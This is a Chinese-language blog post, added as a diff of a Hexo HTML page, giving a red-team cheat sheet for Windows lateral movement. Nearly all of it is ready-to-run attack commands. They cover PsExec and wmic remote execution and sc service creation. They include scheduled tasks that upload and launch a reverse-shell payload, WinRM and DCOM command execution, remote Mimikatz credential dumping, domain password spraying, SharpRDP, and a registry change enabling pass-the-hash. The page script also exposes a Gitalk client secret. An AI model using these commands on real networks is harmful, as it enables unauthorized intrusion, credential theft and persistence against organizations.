@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Lateral Movementt | Twe1ve&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <meta name="description" content="PSEXEC优点：微软的东东 执行原理：   通过ipc$连接，释放psexesvc.exe到目标机器  通过服务管理SCManager远程创建psexecsvc服务，并启动服务  客户端连接执行命令，服务端启动相应的程序并执行回显数据。  运行完后删除服务   使用方式： 1、先建立IPC通道连接，然后直接使用 net use \\192.168.0.116\ipc$ “password” &#x2F;u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lateral Movementt">
+<meta property="og:url" content="https://github.com/2020/06/02/Lateral-Movementt/index.html">
+<meta property="og:site_name" content="Twe1ve&#39;s Blog">
+<meta property="og:description" content="PSEXEC优点：微软的东东 执行原理：   通过ipc$连接，释放psexesvc.exe到目标机器  通过服务管理SCManager远程创建psexecsvc服务，并启动服务  客户端连接执行命令，服务端启动相应的程序并执行回显数据。  运行完后删除服务   使用方式： 1、先建立IPC通道连接，然后直接使用 net use \\192.168.0.116\ipc$ “password” &#x2F;u">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/2020/06/02/Lateral-Movementt/1.png">
+<meta property="article:published_time" content="2020-06-02T03:25:59.000Z">
+<meta property="article:modified_time" content="2020-06-02T03:47:37.129Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2020/06/02/Lateral-Movementt/1.png">
+  
+    <link rel="icon" href="/images/icon.png">
+  
+  
+<link rel="stylesheet" href="/css/index.css">
+
+
+
+  <!-- 百度站長統計-->
+  
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?f4e4f3d9d2532faa71e451f2ab41cbb6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Twe1ve's Blog" type="application/atom+xml">
+</head>
+
+<div class="main height-100 flex flex-v">
+  <div class="phone-header">
+    <a to="/home" class="mobile-logo" > <img src="/images/logo.svg" /> </a>
+    <a class="menu iconfont icon-menu" onclick="toggleMenu()"></a>
+  </div>
+  <div class="main-top flex flex1">
+    <nuxt-link  to="/home" class="mobile-nav-btn iconfont icon-fenlei"></nuxt-link>
+    <!--主页上左部分-->
+    <div class="height-100 main-left  flex flex-v">
+      <div class="main-left-top flex1">
+        <a class="logo">
+          <img src="/images/logo.svg" />
+          <div class="sub-title">废物Twe1ve的垃圾展示台</div>
+        </a>
+        <nav class="nav">
+
+  
+    
+      <a title="首页"  alt="首页"  v-for="(menu,index) in menus" href="/">
+        <div class="icon"><i class="iconfont icon-home"></i></div>
+        <div class="name">
+          <div class="cnname">首页</div>
+          <div class="enname">Home Page</div>
+        </div>
+      </a>
+
+    
+      <a title="归档"  alt="归档"  v-for="(menu,index) in menus" href="/archives">
+        <div class="icon"><i class="iconfont icon-archives"></i></div>
+        <div class="name">
+          <div class="cnname">归档</div>
+          <div class="enname">Archive Page</div>
+        </div>
+      </a>
+
+    
+      <a title="关于我"  alt="关于我"  v-for="(menu,index) in menus" href="./../about">
+        <div class="icon"><i class="iconfont icon-about"></i></div>
+        <div class="name">
+          <div class="cnname">关于我</div>
+          <div class="enname">About Me</div>
+        </div>
+      </a>
+
+    
+  
+
+  <!--<a href="/link/">
+    <div class="icon"><i class="iconfont icon-link"></i></div>
+    <div class="name">
+      <div class="cnname">友情链接</div>
+      <div class="enname">Friends Web Link</div>
+    </div>
+  </a>-->
+</nav>
+
+      </div>
+
+      <view class="website-msg">
+        <div class="beian"><a target="_blank" href="http://www.miitbeian.gov.cn/"></a></div>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <div class="beian"><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></div>
+        <!--
+        <div class="theme-drsc">PowerBy:<a href="https://hexo.io" target="_blank">Hexo</a> ThemeBy:<a href="" target="_blank">Soul</a></div>
+        -->
+        <div class="copyright">Copyright &#169 <a href="mailto:yorojogame@gmail.com">2020 Twe1ve&#39;s Blog</a> </div>
+      </view>
+
+      <div class="social flex flex-align-center ">
+        
+          
+            
+          
+        
+      </div>
+    </div>
+    <!--主页上右部分-->
+    <div class="main-right flex1 flex flex-v">
+    <div class="article-content flex1">
+        <div class="article-content-container">
+            <div class="article-title row">
+                <div class="title">Lateral Movementt</div>
+                <div class=" other">
+                    <!--<i class="iconfont icon-iconfontordinaryliulan"></i> 56--> <i
+                        class="iconfont icon-shijian"></i>· Jun 2, 2020 ·</div>
+            </div>
+            <div class="article-message markdown-body">
+                <article class="text" v-highlight>
+                    <h2 id="PSEXEC"><a href="#PSEXEC" class="headerlink" title="PSEXEC"></a>PSEXEC</h2><p>优点：微软的东东</p>
+<p><strong>执行原理：</strong> </p>
+<ul>
+<li><p>通过ipc$连接，释放psexesvc.exe到目标机器</p>
+</li>
+<li><p>通过服务管理SCManager远程创建psexecsvc服务，并启动服务</p>
+</li>
+<li><p>客户端连接执行命令，服务端启动相应的程序并执行回显数据。</p>
+</li>
+<li><p>运行完后删除服务</p>
+</li>
+</ul>
+<p><strong>使用方式：</strong></p>
+<p>1、先建立IPC通道连接，然后直接使用</p>
+<pre><code>net use \\192.168.0.116\ipc$ “password” /user:administrator
+psexec.exe \\192.168.0.116 cmd                   进入半交互式cmdshell  ；    </code></pre><p>2、在psexec的参数中指定账户密码</p>
+<pre><code>psexec.exe \\192.168.0.116 –u administrator –p password  cmd </code></pre><p>-accepteula参数表示接受Sysinternals的最终用户许可协议，用于机器第一次使用psexec时不跳出提示框</p>
+<p>-hashes可支持hash密码</p>
+<p><strong>使用psexec最低要求</strong></p>
+<ol>
+<li>远程机器的 139 或 445 端口需要开启状态，即 SMB；</li>
+</ol>
+<ol>
+<li>明文密码或者 NTLM 哈希；</li>
+</ol>
+<ol>
+<li>具备将文件写入共享文件夹的权限；</li>
+</ol>
+<ul>
+<li>能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE (访问掩码：0x0002)；</li>
+</ul>
+<ol>
+<li>能够启动所创建的服务：SERVICE_QUERY_STATUS（访问掩码：0x0004）+ SERVICE_START（访问掩码：0x0010）</li>
+</ol>
+<p>在启动psexec建立连接后，远程系统上会被安装一个服务:psexecsvc，安装服务会留下日志，而且psexec推出时有可能服务删除失败，所以不推荐使用psexec,而推荐WMIexec</p>
+<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p><strong>执行原理：</strong></p>
+<p>WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；<br>通过使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，用户可以使用 WMI 管理本地和远程计算机，整个运行过程都在计算机内存中发生，不会留下任何痕迹</p>
+<p><strong>利用条件：</strong></p>
+<ol>
+<li><p>WMI服务开启，端口135，默认开启。</p>
+</li>
+<li><p>防火墙允许135、445等端口通信。</p>
+</li>
+</ol>
+<p><strong>wmic</strong>（03以上自带，缺点是无回显，可以将命令执行结果写入本地磁盘配合type命令远程读取）：</p>
+<p>工作组横向：</p>
+<pre><code>wmic /node:192.168.0.116  /user:tw  /password:viq135311 process call create &quot;cmd.exe /c calc&quot;</code></pre><p>域内横向：</p>
+<pre><code>wmic /node:target.domain /user:domain\user /password:password process call create &quot;cmd.exe /c calc”</code></pre><p><strong><a href="https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs">wmiexec</a></strong>： </p>
+<p>获取半交互式shell：</p>
+<pre><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.0.116 administrator password</code></pre><p>在远程系统上执行单条命令：</p>
+<pre><code>cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password &quot;whoami&quot;</code></pre><p>在远程系统上执行bat脚本：</p>
+<pre><code>cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password c:\programdata\test.bat</code></pre><p><strong>使用hash的情况：</strong><br>wce注入hash再进行连接</p>
+<pre><code>wce –s 账号:主机名或域的名字:LM:NTLM
+
+cscript //nologo wmiexec.vbs /shell 192.168.0.1</code></pre><p>注意：抓取的LM hash是AAD3开头的，或者是No Password之类的，计用32个0代替LM hash</p>
+<p><strong>Invoke-WMIMethod</strong>  （powershell自带,执行单条命令）</p>
+<pre><code>$User=&quot;administrator&quot; 
+$Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force 
+$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password 
+Invoke-WmiMethod -Class win32_process -Name create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.0.116&quot; -Credential $Cred</code></pre><p><a href="https://blog.csdn.net/lhh134/article/details/104150949" target="_blank" rel="noopener">其他的利用</a>还有impacket套件、kali自带的pth-winexe、Invoke-TheHash.ps1(可批量)</p>
+<h2 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h2><p>Service Control；可通过smb创建任务，使用sc命令实现执行SYSTEM权限的命令,执行的文件必须为服务二进制文件</p>
+<pre><code>copy service.exe \\192.168.0.116\admin$\temp
+
+sc \\192.168.0.116 create TestService binpath= &quot;C:\windows\temp\service.exe&quot;
+
+sc \\192.168.0.116 start TestService
+
+sc \\192.168.0.116 delete TestService</code></pre><p>msfvenom生成service exe：</p>
+<pre><code>-f exe-service</code></pre><p>CS生成service exe：</p>
+<pre><code>输出项选择windows service exe</code></pre><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a><a href="https://github.com/Micropoor/Micro8/blob/master/%E7%AC%AC%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%83%E8%AF%BE%EF%BC%9A%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20%5B%20windows%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%88%A9%E7%94%A8%20%5D.pdf">计划任务</a></h2><p>win xp/2003 为at命令</p>
+<p>win7+ 为schtasks命令</p>
+<p><strong>利用条件：</strong></p>
+<ol>
+<li><p>目标管理员账户凭据</p>
+</li>
+<li><p>当前机器可正常net use到远程机器</p>
+</li>
+<li><p>目标机器的计划任务服务“Task scheduler”已正常启动</p>
+</li>
+</ol>
+<pre><code>net use \\192.168.0.116\admin$  /user:administrator  password ###连接目标共享
+
+net time \\192.168.0.116###查看目标主机当前时间
+
+xcopy c:\rev.exe \\192.168.0.116\admin$\temp\###上传payload
+
+chcp 437  ###如果目标为中文系统，需要先调整字符集
+
+schtasks /create /s 192.168.0.116 /u administrator /p password /RL HIGHEST /F /tn &quot;WindowsUpdates&quot; /tr &quot;C:/Windows/temp/rev.exe&quot; /sc DAILY /mo 1 /ST 18:20###在远程目标机器上创建计划任务
+
+schtasks /run /tn WindowsUpdates /s 192.168.0.116 /U administrator /P password   ###创建完成后手动执行
+
+schtasks /query  /s 192.168.0.116 /U administrator /P password | findstr &quot;WindowsUpdates&quot;###检查运行状态
+
+schtasks  /delete /F /tn WindowsUpdates  /U administrator /P password###反弹shell之后，删除计划任务</code></pre><p>参数讲解：</p>
+<p>/TN：任务名称</p>
+<p>/TR：任务执行的程序</p>
+<p>/ST：任务执行的时间</p>
+<h2 id="winRM"><a href="#winRM" class="headerlink" title="winRM"></a>winRM</h2><p><strong>Windows Remote Management</strong><br>通过5985（HTTP）和5986（HTTPS）使用WMI的方式进行远程管理</p>
+<p><strong>利用条件：</strong></p>
+<ol>
+<li><p>在win 2012之后(包括win 2012)的版本是默认开启的，win 2012之前利用需要手动开启winRM。</p>
+</li>
+<li><p>防火墙对5986、5985端口开放。</p>
+</li>
+</ol>
+<p><strong>powershell：</strong></p>
+<p><strong>第一次执行winrm</strong>：当前主机的trustedhosts设置为*，表示信任任意主机，之后重启winRM。</p>
+<pre><code>Set-Item WSMan:localhost\client\trustedhosts -value *
+Restart-Service WinRM</code></pre><p><strong>常用命令：</strong></p>
+<pre><code>Enable-PSRemoting -force   ###需要目标机器开启远程管理
+
+Test-NetConnection 192.168.0.116 -CommonTCPPort WINRM   ###检查目标机器是否监听winrm端口
+
+Get-Item WSMan:\localhost\Client\TrustedHosts   ###检查主机信任
+
+Invoke-Command 192.168.0.116  -Credential $cred -ScriptBlock {Hostname}   ###远程执行命令
+
+Enter-PSSession 192.168.0.116  -Credential  administrator   ###交互式用户凭证shell；会弹出一个输入密码的框</code></pre><p>用户凭证使用：</p>
+<pre><code>$User=&quot;administrator&quot; 
+$Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force 
+$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password 
+Invoke-Command  192.168.0.116  -Credential $cred -ScriptBlock {Hostname}</code></pre><p><strong>直接使用mimikatz获取远程机器的账户密码</strong>：(在域中测试成功，工作组没能成功)</p>
+<pre><code>Import-Module ./Invoke-Mimikatz.ps1
+Invoke-Mimikatz -ComputerName TARGET</code></pre><p><strong>winrs：</strong></p>
+<pre><code>winrs -r:192.168.0.116  -u:administrator -p:password  &quot;ipconfig&quot;  ##执行命令
+winrs -r:192.168.0.116  -u:administrator -p:password  &quot;cmd&quot;         ##shell</code></pre><p><strong>evil-winrm</strong> 可通过用户凭证密码/hash直接获得交互shell</p>
+<h2 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h2><p>COM：COM是Windows应用程序编程接口（API）的组件，该组件支持软件对象之间的交互。 通过COM，客户端对象可以调用服务器对象的方法，这些对象通常是动态链接库（DLL）或可执行文件（EXE）。</p>
+<p>DCOM：Distributed COM；DCOM是COM的网络化版本，DCOM允许COM组件可以利用网络以二进制格式来传输数据</p>
+<p><strong>获取DCOM列表</strong></p>
+<pre><code>Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
+或
+Get-CimInstance Win32_DCOMApplication  #需win12以上</code></pre><p>存在某些具有命令执行功能的DCOM，可用于横向移动</p>
+<p><strong>MMC20.Application COM</strong>：（域中测试成功，工作组只能本地成功而不能远程）<br>查看该DCOM信息：</p>
+<pre><code>Get-ChildItem &apos;registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}&apos;</code></pre><p>与目标建立连接：</p>
+<pre><code>$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.0.116&quot;))
+$com.Document.ActiveView | Get-Member</code></pre><p>通过ExecuteShellCommand执行程序：</p>
+<pre><code>$com.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c hostname &gt; c:\fromdcom.txt&quot;,&quot;7&quot;)</code></pre><p><strong>Excel.Application</strong></p>
+<p><a href="https://github.com/outflanknl/Excel4-DCOM">自动化脚本</a></p>
+<p>##<a href="https://github.com/dafthack/DomainPasswordSpray"> Password Spraying</a> ##</p>
+<p>Password Spraying实际上是域用户爆破</p>
+<p>首次尝试使用一个用于多个用户名的通用密码登录。如果所有用户名的第一个密码都不正确，则攻击者将使用其他密码，在两次不同的密码猜测之间留出足够的时间；即采用大量用户名并使用单个密码将其循环的攻击方法，以免触发任何基于时间的帐户锁定阈值</p>
+<p>自动从当前用户的域中生成用户列表，并尝试使用每个用户名和密码password进行身份验证</p>
+<pre><code>Import-Module .\DomainPasswordSpray.ps1 
+Invoke-DomainPasswordSpray -Password password</code></pre><p><strong>其他可选参数：</strong></p>
+<p>UserList-用于Spraying的用户列表。 如果未指定，将自动生成。</p>
+<p>password-用于Spraying的单个密码。</p>
+<p>PasswordList-用于Spraying的密码列表（不应该过多，导致账户锁定）</p>
+<p>OutFile-输出结果到指定文件</p>
+<p>domain-要对其进行Spraying的域。</p>
+<p>Force-强制喷Spraying继续进行而不提示确认</p>
+<h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p><strong><a href="https://github.com/0xthirteen/SharpRDP">sharpRDP</a></strong>：<br>SharpRDP.exe computername=dc01 command=calc username=offense\administrator password=123456</p>
+<p><strong>CS中实现：</strong></p>
+<p><img src="1.png" alt=""></p>
+<p><strong>基于tscon的RDP会话劫持</strong><br><a href="https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/" target="_blank" rel="noopener">https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/</a></p>
+<p><a href="https://pentestlab.blog/tag/rdp-session-hijacking/" target="_blank" rel="noopener">https://pentestlab.blog/tag/rdp-session-hijacking/</a></p>
+<p><a href="https://ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement" target="_blank" rel="noopener">https://ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement</a></p>
+<h2 id="PTH-amp-PTT-amp-OverPTH"><a href="#PTH-amp-PTT-amp-OverPTH" class="headerlink" title="PTH&amp;PTT&amp;OverPTH:"></a>PTH&amp;PTT&amp;OverPTH:</h2><p>没什么特别的，需要注意的是在win10中，默认启用LocalAccountTokenFilterPolicy，用于控制过滤本地管理员组中所有本地用户的远程连接UAC。</p>
+<p>当LocalAccountTokenFilterPolicy设置为0(默认值)时，只能使用RID 500本地管理员远程连接，且不会已完全的管理员身份进行连接，无法不存在潜在的提权</p>
+<p>需要设置为1，非内置的sid为500的用户才能进行远程连接</p>
+<p>不会影响本地Administrators组中的域帐户，仅影响本地帐户</p>
+<pre><code>cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></pre><p><a href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" target="_blank" rel="noopener">https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/</a></p>
+<h2 id="printers-open-webroots-good-old-Tomcat"><a href="#printers-open-webroots-good-old-Tomcat" class="headerlink" title="printers, open webroots, good old Tomcat"></a>printers, open webroots, good old Tomcat</h2><p>还有就是关注内网打印机、web共享目录、旧版本tomcat等有利于横向的脆弱性设备/环境</p>
+<p>链接：</p>
+<p><a href="https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f" target="_blank" rel="noopener">https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f</a></p>
+<p><a href="https://lengjibo.github.io/LateralMovement/" target="_blank" rel="noopener">https://lengjibo.github.io/LateralMovement/</a></p>
+<p><a href="https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/" target="_blank" rel="noopener">https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/</a></p>
+<p><a href="https://ired.team/offensive-security/lateral-movement" target="_blank" rel="noopener">https://ired.team/offensive-security/lateral-movement</a></p>
+<p><a href="https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/" target="_blank" rel="noopener">https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/</a></p>
+<p><a href="https://my.oschina.net/u/4283892/blog/3307767" target="_blank" rel="noopener">https://my.oschina.net/u/4283892/blog/3307767</a></p>
+
+                </article>
+            </div>
+            <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<style>
+    .hljs {
+        display: block !important;
+        overflow-x: auto !important;
+        background: #2b2b2b !important;
+        color: #f8f8f2 !important;
+        padding: .5em !important;
+    }
+</style>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '85810192d72d7f763a9a',
+        clientSecret: 'e9867192041e53ad9f4581db6e50bbe7373a090d',
+        repo: 'myblog',
+        owner: 'callmesoul',
+        admin: ['callmesoul'],
+        id: '', // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+        </div>
+    </div>
+</div>
+
+<link href="https://cdn.bootcss.com/highlight.js/9.15.7/styles/a11y-dark.min.css" rel="stylesheet">
+<script src="https://cdn.bootcss.com/highlight.js/9.15.9/highlight.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+        document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+        });
+    });
+</script>
+  </div>
+  <!--
+  <div class="main-bottom">
+    <div class="music flex flex-pack-justify flex-align-center">
+      <div class="control">
+        <a onclick="preSong()"><span class="iconfont icon-shangyishou"></span></a>
+        <a onclick="playControl()"><span class="iconfont play-icon icon-kaishi1"></span></a>
+        <a onclick="nextSong()"><span class="iconfont icon-xiayishou-copy"></span></a>
+      </div>
+      <div class="msg">
+        <span class="time"></span>
+        <div class="line" ref="progress-line-warp">
+          <div class="song-msg">周杰伦 - 说好不哭</div>
+          <!--<div class="current-line" ref="progress-line">
+            <a tag="a" class="target" v-on:mousedown.prevent="mousedown"></a>
+          </div>-->
+        </div>
+        <span class="all-time"></span>
+      </div>
+      <div class="right-control">
+        <a class="order-btn flex flex-align-center" onclick="toogleShowMusicList()">
+          <span class="iconfont icon-ttpodicon"></span>
+          <span class="number flex1">3</span>
+        </a>
+      </div>
+      <audio id="audio" class="mian-audio" src="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3">
+        Your browser does not support the audio element.
+      </audio>
+    </div>
+  </div>
+  <div class="music-list">
+    <div id="musiclist">
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 说好不哭" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3" onclick="changePlayIndex(0)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">说好不哭 - 周杰伦</span>
+        </a>
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 爱在西元前" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E7%88%B1%E5%9C%A8%E8%A5%BF%E5%85%83%E5%89%8D%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(1)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">爱在西元前 - 周杰伦</span>
+        </a>
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 龙拳" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E9%BE%99%E6%8B%B3%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(2)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">龙拳 - 周杰伦</span>
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+<script>
+  var playIndex = localStorage.getItem('playIndex') ? parseInt(localStorage.getItem('playIndex')) : 0
+  let musics = $('.music-item')
+  musics.eq(playIndex).addClass('active')
+  var audio = document.getElementById("audio");
+
+  $('.song-msg').html(musics[playIndex].dataset.name)
+  audio.src = musics[playIndex].dataset.url
+
+
+  var playbtn = document.getElementsByClassName("play-icon")[0];
+  var playing = false;
+  audio.loop = false;
+  audio.addEventListener('ended', function () {
+    playbtn.classList.remove("icon-kaishi")
+    playbtn.classList.add("icon-kaishi1")
+    playing = false
+  }, false);
+  audio.addEventListener('play', function () {
+    playbtn.classList.remove("icon-kaishi1")
+    playbtn.classList.add("icon-kaishi")
+    playing= true
+  }, false);
+  audio.addEventListener('pause', function () {
+    playbtn.classList.remove("icon-kaishi")
+    playbtn.classList.add("icon-kaishi1")
+    playing = false
+  }, false);
+  function toogleShowMusicList() {
+    var musiclist = document.getElementsByClassName("music-list")[0];
+    if(musiclist.className.indexOf("active") === -1){
+      musiclist.classList.add("active")
+    }else{
+      musiclist.classList.remove("active");
+    }
+  }
+
+  function playControl() {
+    if(playing){
+      audio.pause()
+    }else{
+      audio.play()
+    }
+  }
+
+  function changePlayIndex(index) {
+    if(playIndex !== index){
+      localStorage.setItem('playIndex',index)
+      playIndex = index
+      musics.removeClass('active')
+      musics.eq(playIndex).addClass('active')
+      $('.song-msg').html(musics[playIndex].dataset.name)
+      audio.src = musics[playIndex].dataset.url
+      audio.play()
+    }else{
+      playControl()
+    }
+  }
+
+  function preSong() {
+    var index
+    if(playIndex === 0){
+      index = musics.length - 1
+    }else{
+      index = playIndex - 1
+    }
+    changePlayIndex(index)
+  }
+
+  function nextSong() {
+    var index
+    if(playIndex === musics.length - 1){
+      index = 0
+    }else{
+      index = playIndex + 1
+    }
+    changePlayIndex(index)
+  }
+-->
+  function toggleMenu() {
+    var mainLeft = $('.main-left')
+    if(mainLeft.hasClass('active')){
+      mainLeft.removeClass('active')
+      $('.menu').removeClass('icon-close')
+      $('.menu').addClass('icon-menu')
+    }else{
+      mainLeft.addClass('active')
+      $('.menu').removeClass('icon-menu')
+      $('.menu').addClass('icon-close')
+    }
+  }
+</script>
